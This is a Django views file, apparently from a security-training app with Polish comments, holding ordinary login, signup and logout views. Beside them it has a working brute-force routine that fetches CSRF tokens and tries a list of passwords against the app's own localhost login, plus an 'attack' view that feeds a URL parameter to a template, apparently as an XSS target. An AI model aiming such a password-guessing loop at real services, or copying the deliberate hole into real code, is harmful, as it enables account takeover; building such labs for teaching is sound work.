from django.shortcuts import render, redirect
from .forms import MyAuthenticationForm
from django.contrib.auth import login, logout
from django.contrib.auth.decorators import login_required
from .classes import MyBaseUserCreationForm
import requests


def brute_force_login(base_url, username, password_list):
    """
    Przykład symulacji ataku brute-force na aplikację webową.
    Args:
        base_url: URL aplikacji Django (np. "http://127.0.0.1:8000").
        username: Nazwa użytkownika do zalogowania.
        password_list: Lista haseł do przetestowania.
    """
    login_url = f"{base_url}/app"  # Strona logowania
    session = requests.Session()  # Utworzenie sesji HTTP

    for password in password_list:
        # Przygotowanie danych POST
        payload = {
            'csrfmiddlewaretoken': session.get(login_url).cookies['csrftoken'],
            'username': username,
            'password': password,
        }

        # Wysłanie żądania POST
        response = session.post(login_url, data=payload)

        if response.url.endswith('/tasks'):  # Jeśli zalogowano poprawnie (przekierowanie)
            print(f"Zalogowano poprawnie! Hasło to: {password}")
            return password

        print(f"Próba z hasłem '{password}' nieudana.")

    print("Nie udało się znaleźć poprawnego hasła.")
    return None


def brute_force(request):
    base_url = "http://127.0.0.1:8000"
    username = "test123"
    password_list = ["haslo1", "haslo12", "haslo123"]  # Lista haseł

    password = brute_force_login(base_url, username, password_list)
    print(password)
    return redirect("app:index")


def attack(request):
    """
    Widok obsługujący stronę /app/attack.
    Umożliwia wprowadzenie komunikatu i jego wyświetlenie.
    """
    message = None  # Domyślna wartość, gdy nic nie zostanie przesłane

    if request.method == "GET" and 'msg' in request.GET:
        message = request.GET['msg']  # Pobieramy komunikat z parametrów URL
    
    return render(request, 'app/attack.html', {'message': message})


def index(request):

    if request.user.is_authenticated:
        return redirect("app:tasks")

    if request.method == "POST": 
        
        if "signup" in request.POST:
            sign_up_form = MyBaseUserCreationForm(request.POST)
            sign_in_form = MyAuthenticationForm()
            
            if sign_up_form.is_valid():
                user = sign_up_form.save()
                login(request, user)
                return redirect("app:tasks")
        

        if "signin" in request.POST:
            sign_in_form = MyAuthenticationForm(request, data=request.POST)
            sign_up_form = MyBaseUserCreationForm()
            
            if sign_in_form.is_valid():
                user = sign_in_form.get_user()
                login(request, user)
                return redirect("app:tasks")
    
    else:
        sign_up_form = MyBaseUserCreationForm()
        sign_in_form = MyAuthenticationForm()

    context = {
        "sign_up_form": sign_up_form,
        "sign_in_form": sign_in_form
    }

    return render(request, "app/index.html", context)
    
@login_required
def tasks(request):
    username = request.user.username
    
    context = {"username": username}
    return render(request, "app/tasks.html", context)

def logout_view(request):
    logout(request)
    return redirect("app:index")


def reflected_xss(request):
    pass

def stored_xss(request):
    return render(request, "app/stored_xss.html")

def dom_xss(request):
    pass

def brute_force(request):
    return render(request, "app/brute_force.html")